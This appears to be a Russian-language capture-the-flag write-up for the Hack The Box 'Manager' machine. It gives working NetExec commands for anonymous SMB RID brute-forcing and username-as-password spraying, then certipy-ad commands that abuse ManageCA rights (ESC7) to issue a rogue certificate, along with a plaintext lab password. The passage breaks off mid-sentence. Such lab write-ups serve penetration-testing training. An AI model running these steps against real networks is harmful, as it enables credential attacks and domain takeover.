![Pasted image 20260630175029](./screenshots/Pasted%20image%2020260630175029.png)

SMB сервер позволяет подключатся анонимно, но при этом не позволяет просматривать директории. Мы можем использовать это, для перебора пользователей по RID. Для этого мы используем NetExec (важно что юзернейм может быть любой, но пароль должен быть пустой):

```
netexec smb 10.129.28.106 -u 'Anonumous' -p '' --rid-brute
```
![Pasted image 20260630175511](./screenshots/Pasted%20image%2020260630175511.png)

Получаем список пользователей, так как паролей нет, можно попробовать поспреить пароли, передавая в качестве пароля ник пользователя. У нас получается следующий список, который мы предварительно перевели в нижний регистр(желательно должно быть два варианта, полностью в нижнем регистре и с первой большой буквы):


```
netexec smb 10.129.28.106 -u users.txt -p users.txt --no-bruteforce
```

В отчете указано, что пользователь Raven обладает опасными правами доступа, в частности, правами «ManageCA» над центром сертификации. Это означает, что, используя сценарий ESC7, мы потенциально можем повысить свои привилегии до уровня администратора домена, работая от имени пользователя Raven.

Теперь, когда мы являемся «офицерjv», мы можем выдавать и управлять сертификатами. Шаблон `SubCA` можно включить в центре сертификации с помощью флага `-enable-template`.

```
┌─[eu-dedivip-2]─[10.10.15.222]─[pwnbox@htb-cpvyzyxsgj]─[~/Desktop]
└──╼ [★]$ certipy-ad ca -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.129.28.106 -ca manager-dc01-ca -enable-template subca
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'manager-dc01-ca'
```

Теперь давайте запросим сертификат на основе шаблона SubCA. Этот запрос будет отклонен, но мы получим идентификатор запроса и закрытый ключ, которые сохраним в файл.

```
┌─[eu-dedivip-2]─[10.10.15.222]─[pwnbox@htb-cpvyzyxsgj]─[~]
└──╼ [★]$ certipy-ad req -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.129.28.106 -ca manager-dc01-ca -retrieve 19
```

Мы отмечаем, что идентификатор запроса сертификата равен 19. Теперь воспользуемся полученными правами, чтобы вручную выдать не прошедший проверку сертификат с помощью команды ca и параметра `-issue-request <идентификатор запроса>`.

```
┌─[eu-dedivip-2]─[10.10.15.222]─[pwnbox@htb-cpvyzyxsgj]─[~]
└──╼ [★]$ certipy-ad ca -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.129.28.106 -ca manager-dc01-ca -issue-request 19
```


Имея в своем распоряжении файл PFX администратора, мы можем использовать его для аутентификации. При выполнении команды аутентификации мы сталкиваемся с ошибкой "KRB_AP_ERR_SKEW (Слишком большое расхождение во времени)".

Используем команду для того чтобы запросить время с контроллера домена

```
┌─[eu-dedivip-2]─[10.10.15.222]─[pwnbox@htb-cpvyzyxsgj]─[~]
└──╼ [★]$ sudo ntpdate -s manager.htb
```

Без неё будет ошибка:
